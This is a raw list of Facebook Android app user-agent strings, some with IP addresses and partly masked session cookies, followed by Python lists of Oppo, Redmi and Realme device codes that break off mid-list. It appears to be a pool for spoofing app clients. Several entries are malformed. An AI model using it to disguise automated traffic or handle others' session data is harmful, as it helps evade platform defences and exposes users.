Dalvik/2.1.0 (Linux; Android 10; POCOPHONE F1) [FBAN/MobileAdsManagerAndroid;FBAV/324.0.0.28.115;FBBV/464692125;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/en_US;FBMF/POCOPHONE;FBBF/Poco;FBDV/Poco F1;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1424};FB_FW/1;]
SupportsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J260M Build/M1AJB) [FBAN/EMA;FBBV/481407333;FBAV/358.0.0.8.62;FBDV/SM-J260M;FBLC/pt_BR;FBNG/4G;FBMNT/METERED;FBDM/{density=1.5}]
Dalvik/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build/N2G48H) [FBAN/FB4A;FBAV/382.0.0.33.111;FBPN/com.facebook.katana;FBLC/zh_CN;FBBV/394408512;FBCR/EE;FBMF/Asus;FBBD/Asus;FBDV/ASUS_Z01QD;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=800,height=1280};FB_FW/1;FBRV/0;]
Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019) [FBAN/FB4A;FBAV/382.0.0.33.111;FBPN/com.facebook.katana;FBLC/km_KH;FBBV/394408901;FBCR/Metfone;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1424};FB_FW/1;FBRV/396611140;]
dalvik/ 2.1.0 (linux; u, Android 13 SM-A326B build/ TP1A.220624.014) [FBAN/Orca-_FBAN/FB4A;FBAV/420.0.0.32.61;FBBV/486988352;FBDM42-29
Browser Dalvik/2.1.0 (Linux; U; Android 11; Nokia C30 Build/RP1A.201005.001) [FBAN/FB4A;FBAV/409.0.0.27.106;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/462563379;FBCR/Telstra;FBMF/HMD Global;FBBD/Nokia;FBDV/Nokia C30;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=720,height=1479};FB_FW/1;FBRV/465181455;] Cookie Q03k********************
SupportsFresco=1 modular=2 Dalvik/2.1.0 (Linux; U; Android 10; M2006C3LG MIUI/V12.0.18.0.QCDMIXM) [FBAN/EMA;FBBV/492764971;FBAV/363.0.0.6.63;FBDV/M2006C3LG;FBLC/es_ES;FBNG/WIFI;FBMNT/NOT_METERED;FBDM/{density=2.0}]
Dalvik/2.1.0 (Linux; U; Android 7.0.0; MMB29K Build/GT-I5508) [FBAN/FB4A;FBAV/409.0.0.13.251;FBBV/349036431;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/349036431;FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/MMB29K;FBSV/7.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 7.0.0; GT-N7105 Build/GT-7320) [FBAN/FB4A;FBAV/133.0.0.48.536;FBBV/137289708;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/137289708;FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/GT-N7105;FBSV/7.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;FB_FW/1;]
Dalvik/2.1.0 (Linux\; U\; Android 11\; SM-N975F Build/RP1A.200720.012) [FBAN/AudienceNetworkForAndroid\;FBSN/Android\;FBSV/11\;FBAB/com.antutu.ABenchMark\;FBAV/8.2.4\;FBBV/8020400\;FBVS/5.6.0\;FBLC/ru_RU]
Dalvik/2.1.0 (Linux; U; Android 9; VIA P3Dalvik/2.1.0 (Linux; U; Android 9; VIA_P3 Build/PPR1.180610.011) [FBAN/FB4A;FBAV/417.0.0.33.65;FBPN/com.facebook.katana;FBLC/tr_TR;FBBV/480085463;FBCR/Turk Telekom;FBMF/Casper;FBBD/Casper;FBDV/VIA_P3;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1360};FB_FW/1;FBRV/0;]
Dalvik/2.1.0 (Linux; U; Android 13; SM-S901U Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/421.0.0.12.61;FBPN/com.facebook.orca;FBLC/en_US;FBBV/502432091;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-S901U;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2115};FB_FW/1;]
IP address 118.148.81.136 Browser SupportsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android 11; 5033T Build/RP1A.200720.011) [FBAN/EMA;FBBV/504520132;FBAV/368.0.0.5.95;FBDV/5033T;FBLC/en_GB;FBNG/WIFI;FBMNT/NOT_METERED;FBDM/{density=1.5}] Cookie
Dalvik/2.1.0 (Linux; U; Android 5.1.1; F1w Build/LMY47V) [FBAN/FB4A;FBAV/94.0.0.17.68;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/38831839;FBCR/VINAPHONE;FBMF/OPPO;FBBD/OPPO;FBDV/F1w;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1280};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 12; TECNO KI5k Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/377.0.0.13.101;FBPN/com.facebook.orca;FBLC/en_US;FBBV/396116327;FBCR/LoneStar;FBMF/TECNO;FBBD/TECNO;FBDV/TECNO KI5k;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 12; SM-A217F Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/422.0.0.18.107;FBPN/com.facebook.orca;FBLC/pt_PT;FBBV/505323569;FBCR/Unitel STP;FBMF/samsung;FBBD/samsung;FBDV/SM-A217F;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1532};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 7.0; M5 Note Build/NRD90M) [FBAN/FB4A;FBAV/292.0.0.61.123;FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/251145728;FBCR/MegaFon;FBMF/Meizu;FBBD/Meizu;FBDV/M5 Note;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;FBRV/0;]
Dalvik/2.1.0 (Linux; U; Android 12; TECNO KI5k Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/377.0.0.13.101;FBPN/com.facebook.orca;FBLC/en_US;FBBV/396116327;FBCR/MTN;FBMF/TECNO;FBBD/TECNO;FBDV/TECNO KI5k;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 13; SM-S134DL Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/405.0.0.16.112;FBPN/com.facebook.orca;FBLC/en_US;FBBV/466674869;FBCR/&amp;#160-;FBMF/samsung;FBBD/samsung;FBDV/SM-S134DL;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=1.875,width=720,height=1465};FB_FW/1;]
SupportsFresco=1 modular=1 Dalvik/2.1.0 (Linux; U; Android 12; CPH2145 Build/QP1A.965769.938)[FBAN/FB4A;FBAV/246.0.0.4.115;FBPN/com.facebook.katana;FBLC/in_ID;FBBV/13543083;FBCR/Telenor;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2145;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=720,height=1520};FB_FW/1;]
SupportsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android 12; SM-A032F Build/SP1A.210812.016) [FBAN/EMA;FBBV/504520132;FBAV/368.0.0.5.95;FBDV/SM-A032F;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]
Dalvik/2.1.0 (Linux; U; Android 8.1; Dragon Face Build/NHG47L) [FBAN/FB4A;FBAV/343.0.0.37.117;FBPN/com.facebook.katana;FBLC/ar_EG;FBBV/329937443;FBCR/null;FBMF/Amlogic;FBBD/Amlogic;FBDV/Dragon Face;FBSV/8.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.0,width=1280,height=720};FB_FW/1;FBRV/332189930;]
Dalvik/2.1.0 (Linux; U; Android 5.1; Vowney Build/LMY47I) [FBAN/Orca-Android;FBAV/271.0.0.11.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/227270172;FBCR/null;FBMF/elephone;FBBD/elephone;FBDV/Vowney;FBSV/5.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2368};FB_FW/1;]
SupportsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android 12; SM-A032F Build/SP1A.210812.016) [FBAN/EMA;FBBV/509523294;FBAV/370.0.0.16.116;FBDV/SM-A032F;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]
Dalvik/2.1.0 (Linux; U; Android 9; JKM-LX1 Build/HUAWEIJKM-LX1) [FBAN/MessengerLite;FBAV/273.0.0.16.48;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/325178905;FBCR/null;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/JKM-LX1;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2137};]
Dalvik/2.1.0 (Linux; U; Android 12; CPH2385 Build/SP1A.210812.016) [FBAN/AudienceNetworkForAndroid;FBSN/Android;FBSV/12;FBAB/com.miniclip.realsniper;FBAV/500202;FBBV/500202;FBVS/6.12.0;FBLC/en_NZ]
SupportsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/514553987;FBAV/372.0.0.15.104;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]
Dalvik/2.1.0 (Linux; U; Android 12; SM-A125F Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/384.0.0.18.104;FBPN/com.facebook.orca;FBLC/lt_LT;FBBV/412138691;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-A125F;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=1.875,width=720,height=1465};FB_FW/1;]
Dalvik/2.1.0 (Linux\; U\; Android 13\; M2101K7BNY Build/TP1A.220624.014) [FBAN/AudienceNetworkForAndroid\;FBSN/Android\;FBSV/13\;FBAB/cat.mansion.merge.games\;FBAV/1.06\;FBBV/106\;FBVS/6.14.0\;FBLC/ru_RU]
SupportsFresco=1 modular=2 Dalvik/2.1.0 (Linux; U; Android 12; SM-M325F Build/SP1A.210812.016) [FBAN/InstagramCarbon;FBBV/514553402;FBAV/372.0.0.15.104;FBDV/SM-M325F;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.8125}]
Dalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SGS32.39-181-5) [FBAN/Orca-Android;FBAV/424.0.0.25.113;FBPN/com.facebook.orca;FBLC/en_US;FBBV/510343531;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBDV/moto g play - 2023;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1439};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 13; M2103K19G Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/416.0.0.9.76;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/491071575;FBCR/JAZZTEL;FBMF/Xiaomi;FBBD/Redmi;FBDV/M2103K19G;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=3.375,width=1080,height=2138};FB_FW/1;] FBBK/1
SupportsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android 12; Infinix X6516 Build/SP1A.210812.001) [FBAN/EMA;FBBV/426325710;FBAV/332.0.0.22.108;FBDV/Infinix X6516;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]
SupportsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/519821535;FBAV/374.0.0.10.114;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]
SupportsFresco=1 modular=2 Dalvik/2.1.0 (Linux; U; Android 12; CPH2385 Build/SP1A.210812.016) [FBAN/EMA;FBBV/522056763;FBAV/375.0.0.7.111;FBDV/CPH2385;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]
Dalvik/2.1.0 (Linux; U; Android 10; SM-T835 Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/342.1.0.14.119;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/339015011;FBCR/YES OPTUS;FBMF/samsung;FBBD/samsung;FBDV/SM-T835;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=1600,height=2452};FB_FW/1;]
SupportsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/522056759;FBAV/375.0.0.7.111;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]
SupportsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android 12; SM-A032F Build/SP1A.210812.016) [FBAN/EMA;FBBV/522056759;FBAV/375.0.0.7.111;FBDV/SM-A032F;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]
Dalvik/2.1.0 (Linux; U; Android 13; Leelbox Build/PPR1.281373.396) [FBAN/FB4A;FBAV/271.0.0.55.109;FBBV/215365690;FBDM/{density=3.0,width=1080,height=2208};FBLC/en_GB;FBRV/216077496;FBCR/inwi;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1989;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]
Dalvik/2.1.0 (Linux; U; Android 11; Z6356T Build/RP1A.201005.001) [FBAN/Orca-Android;FBAV/428.0.0.35.115;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/520514255;FBCR/Telstra;FBMF/ZTE;FBBD/ZTE;FBDV/Z6356T;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.25,width=720,height=1466};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 11; Z6356T Build/RP1A.201005.001) [FBAN/Orca-Android;FBAV/428.0.0.35.115;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/520514424;FBCR/Telstra;FBMF/ZTE;FBBD/ZTE;FBDV/Z6356T;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1476};FB_FW/1;]
SupportsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/523694232;FBAV/376.0.0.7.103;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]
Dalvik/2.1.0 (Linux; U; Android 8.0.0; RNE-L22 Build/HUAWEIRNE-L22) [FBAN/Orca-Android;FBAV/426.0.0.27.102;FBPN/com.facebook.orca;FBLC/in_ID;FBBV/515381945;FBCR/Telkomsel;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/RNE-L22;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1080,height=2050};FB_FW/1;]
Browser	Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-S7560M Build/IMM76I) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_CA;FBBV/14274145;FBCR/Bell;FBMF/samsung;FBBD/samsung;FBDV/GT-S7560M;FBSV/4.0.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=480,height=800};FB_FW/1;]
BrowserDalvik/1.6.0 (Linux; U; Android 4.0.4; GT-S7560M Build/IMM76I) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_CA;FBBV/14274145;FBCR/Bell;FBMF/samsung;FBBD/samsung;FBDV/GT-S7560M;FBSV/4.0.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=480,height=800};FB_FW/1;]
SupportsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/529276760;FBAV/378.0.0.12.118;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]
Dalvik/2.1.0 (Linux; U; Android 12; SM-A217F Build/SP1A.210812.016) [FBAN/AudienceNetworkForAndroid;FBSN/Android;FBSV/12;FBAB/com.miniclip.carrom;FBAV/15.2.0;FBBV/931;FBVS/6.16.0;FBLC/en_GB]
Dalvik/2.1.0 (Linux; U; Android 13.0; Samsung Galaxy S21 Build/OPR1.8610) [FBAN/EMA;FBBV/470353487;FBAV/353.0.0.5.112;FBDV/Samsung Galaxy S21;FBLC/id_ID;FBNG/WIFI;FBMNT/METERED;FBDM/{density=3.0}]
SupportsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/531759371;FBAV/379.0.0.8.118;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]
SupportsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/426325710;FBAV/332.0.0.22.108;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]
SupportsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android 11; SM-A725F Build/RP1A.200720.012) [FBAN/EMA;FBBV/531759373;FBAV/379.0.0.8.118;FBDV/SM-A725F;FBSV/11;FBCX/OkHttp3;FBDM/{density=2.8125}]
SupportsFresco=1+modular=3+Dalvik/2.1.0+(Linux;+U;+Android+12;+TECNO+BF6+Build/SP1A.210812.001)+[FBAN/EMA;FBBV/534334734;FBAV/380.0.0.14.112;FBDV/TECNO+BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]
Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 8T Build/RKQ1.201004.002) [FBAN/Orca-Android;FBAV/433.0.0.32.117;FBPN/com.facebook.orca;FBLC/cs_CZ;FBBV/532438891;FBCR/O2.CZ;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1
SupportsFresco=1 modular=2 Dalvik/2.1.0 (Linux; U; Android 12; moto g pure Build/S3RHS32.20-42-10-4-9) [FBAN/EMA;FBBV/536599395;FBAV/381.0.0.8.100;FBDV/moto g pure;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.25}]
SupportsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android 12; SM-A032F Build/SP1A.210812.016) [FBAN/EMA;FBBV/531759371;FBAV/379.0.0.8.118;FBDV/SM-A032F;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]
SupportsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android 9; CPH1923 Build/PPR1.180610.011) [FBAN/EMA;FBBV/536599416;FBAV/381.0.0.8.100;FBDV/CPH1923;FBSV/9;FBCX/OkHttp3;FBDM/{density=2.0}]
Dalvik/2.1.0 (Linux; U; Android 13; SM-G780G Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/435.0.0.32.108;FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/537314828;FBCR/VIVO;FBMF/samsung;FBBD/samsung;FBDV/SM-G780G;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2168};FB_FW/1
SupportsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android 12; SM-A032F Build/SP1A.210812.016) [FBAN/EMA;FBBV/538547664;FBAV/382.0.0.11.115;FBDV/SM-A032F;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]
SupportsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android 12; itel A662L Build/SP1A.210812.016) [FBAN/EMA;FBBV/538547664;FBAV/382.0.0.11.115;FBDV/itel A662L;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]
SupportsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android 11; SM-A032F Build/RP1A.201005.001) [FBAN/EMA;FBBV/538547664;FBAV/382.0.0.11.115;FBDV/SM-A032F;FBSV/11;FBCX/OkHttp3;FBDM/{density=2.0}]
SupportsFresco=1 modular=2 Dalvik/2.1.0 (Linux; U; Android 12; TECNO KI5k Build/SP1A.210812.016) [FBAN/EMA;FBBV/538547666;FBAV/382.0.0.11.115;FBDV/TECNO KI5k;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]
SupportsFresco=1 modular=2 Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF7 Build/SP1A.210812.016) [FBAN/EMA;FBBV/543543184;FBAV/384.0.0.8.114;FBDV/TECNO BF7;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]
Nov 26, 2023, 2:44 PM Updated Dec 11, 2023, 9:17 PM IP address 180.150.80.61 Browser Dalvik/2.1.0 (Linux; U; Android 13; SM-G988B Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/437.0.0.26.230;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/543663526;FBCR/Telstra;FBMF/samsung;FBBD/samsung;FBDV/SM-G988B;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=2.8125,width=1080,height=2191};FB_FW/1;] Cookie dIyo********************
Browser Dalvik/2.1.0 (Linux; U; Android 13; SM-G988B Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/437.0.0.26.230;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/543663526;FBCR/Telstra;FBMF/samsung;FBBD/samsung;FBDV/SM-G988B;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=2.8125,width=1080,height=2191};FB_FW/1;] Cookie dIyo********************
Nov 26, 2023, 2:44 PM Updated Dec 11, 2023, 9:17 PM IP address 180.150.80.61 Browser Dalvik/2.1.0 (Linux; U; Android 13; SM-G988B Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/437.0.0.26.230;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/543663526;FBCR/Telstra;FBMF/samsung;FBBD/samsung;FBDV/SM-G988B;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=2.8125,width=1080,height=2191};FB_FW/1;] Cookie dIyo********************Browser [FBAN/FB4A;FBAV/443.0.0.23.229;FBBV/543547987;FBDM/{density=2.8125,width=1080,height=2191};FBLC/en_US;FBRV/545582941;FBCR/Telstra;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G988B;FBSV/13;FBOP/1;FBCA/arm64-v8a:;] Cookie wqx2********************
SupportsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android 12; SM-A032F Build/SP1A.210812.016) [FBAN/EMA;FBBV/543543178;FBAV/384.0.0.8.114;FBDV/SM-A032F;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]
SupportsFresco=1 modular=3 Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/545357868;FBAV/385.0.0.11.112;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]
SupportsFresco=1 modular=2 Dalvik/2.1.0 (Linux; U; Android 9; CPH1923 Build/PPR1.180610.011) [FBAN/EMA;FBBV/545357871;FBAV/385.0.0.11.112;FBDV/CPH1923;FBSV/9;FBCX/OkHttp3;FBDM/{density=2.0}]
SupportsFresco=1 modular=2 Dalvik/2.1.0 (Linux; U; Android 12; CPH2477 Build/SP1A.210812.016) [FBAN/EMA;FBBV/545357871;FBAV/385.0.0.11.112;FBDV/CPH2477;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]
 
  build_nokiax = ['JDQ39','JZO54K']
  oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
  redmi = ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]
  realme =  ["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", 